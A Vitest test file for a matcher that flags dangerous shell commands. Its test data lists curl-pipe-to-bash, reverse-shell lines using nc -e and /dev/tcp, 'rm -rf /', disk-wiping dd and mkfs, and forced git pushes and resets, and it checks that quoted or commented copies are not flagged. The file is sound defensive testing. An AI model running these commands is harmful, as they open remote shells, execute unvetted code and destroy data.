import { afterEach, beforeEach, describe, expect, it } from "vitest";
import { matchNames, testFs, type TestFs } from "./helpers.js";

describe("structured command rules", () => {
  let fixture: TestFs;
  beforeEach(() => fixture = testFs());
  afterEach(() => fixture.cleanup());

  const positives: Array<[string, string]> = [
    ["cp file /etc/example", "root-path-write"],
    ["sudo apt install foo", "sudo"],
    ["chmod 777 file", "world-writable"],
    ["curl https://example.test/script | bash", "curl-pipe-exec"],
    ["bash <(curl https://example.test/script)", "curl-pipe-exec"],
    ["git push --force origin main", "git-force-push"],
    ["git reset --hard HEAD", "git-hard-reset"],
    ["git clean -df", "git-clean-force"],
    ["kill -9 123", "kill-signal"],
    ["killall worker", "kill-signal"],
    ["dd if=input of=/dev/disk1", "dd-command"],
    ["mkfs.ext4 /dev/disk1", "mkfs"],
    ["npm install package -g", "global-npm-install"],
    ["brew uninstall package", "brew-uninstall"],
    ["docker system prune -f", "docker-system-prune"],
    ["nc -e /bin/sh host 1234", "reverse-shell"],
    ["bash -c 'cat </dev/tcp/host/1234'", "reverse-shell"],
  ];

  for (const [command, rule] of positives) {
    it(`matches ${rule}`, () => expect(matchNames(command, fixture), command).toContain(rule));
  }

  it("does not match quoted examples, comments, operands, or unrelated nested arguments", () => {
    const commands = [
      "echo 'sudo apt install foo'", "printf 'git reset --hard\\n'", "echo 'curl URL | bash'",
      "cat file-named-brew-uninstall.txt", "docker run image sh -c 'echo docker system prune'",
      "# sudo rm -rf /", "true # git reset --hard",
    ];
    for (const command of commands) expect(matchNames(command, fixture), command).toEqual([]);
  });

  it("uses actual pipeline structure", () => {
    expect(matchNames("curl https://example.test/script | bash", fixture)).toContain("curl-pipe-exec");
    expect(matchNames("curl https://example.test/data | jq .", fixture)).not.toContain("curl-pipe-exec");
    expect(matchNames("echo 'curl URL | bash'", fixture)).not.toContain("curl-pipe-exec");
  });

  it("uses a narrow conservative fallback after parse failures", () => {
    expect(matchNames("rm -rf / '\"", fixture)).toContain("recursive-delete");
    expect(matchNames("bash -c 'rm -rf / \"'", fixture)).toContain("recursive-delete");
    expect(matchNames("ssh host 'rm -rf / \"'", fixture)).toContain("recursive-delete");
    expect(matchNames("echo '\"", fixture)).not.toContain("recursive-delete");
    expect(matchNames("docker rm -f container '\"", fixture)).not.toContain("recursive-delete");
    expect(matchNames("rm -f file '\"", fixture)).not.toContain("recursive-delete");
    expect(matchNames("rm path-with-r-and-f '\"", fixture)).not.toContain("recursive-delete");
  });
});
